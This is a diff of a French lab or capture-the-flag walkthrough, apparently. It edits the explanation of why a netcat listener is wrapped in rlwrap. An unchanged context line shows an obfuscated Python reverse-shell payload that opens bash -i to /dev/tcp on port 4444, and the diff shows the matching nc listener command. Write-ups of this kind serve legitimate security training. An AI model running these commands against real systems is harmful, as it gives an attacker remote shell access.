@@ -603,21 +603,13 @@ p = getattr(m, 'po'+'pen')("bash -c 'bash -i >& /dev/tcp/TON_IP/4444 0>&1'")
 print(getattr(p, 're'+'ad')())
 ```
 
-Pour obtenir un shell plus stable et plus confortable à utiliser, le listener est lancé avec `rlwrap`, un outil fourni par défaut avec Kali Linux :
+Depuis ton Kali, tu lances le listener avec `rlwrap` pour obtenir un reverse shell plus confortable qu’avec `nc` seul :
 
 ```bash
 rlwrap -cAr nc -lvnp 4444
 ```
 
-> `rlwrap` ajoute l’historique des commandes, l’édition de ligne et une meilleure gestion du terminal interactif.
->
-> Avec un listener lancé uniquement via `nc -lvnp 4444`, la stabilisation du shell avec `pty.spawn("/bin/bash")` peut provoquer une erreur comme :
->
-> ```bash
-> bash: [1737: 2 (255)] tcsetattr: Inappropriate ioctl for device
-> ```
->
-> et provoquer la fermeture du shell avec une commande `exit`.
+`rlwrap` améliore l’utilisation du shell en ajoutant notamment l’historique des commandes et une meilleure édition de ligne. Cela évite aussi certains comportements instables observés avec un simple `nc -lvnp 4444`, notamment lors stabilisation avec `pty.spawn("/bin/bash")`.
 
 
 
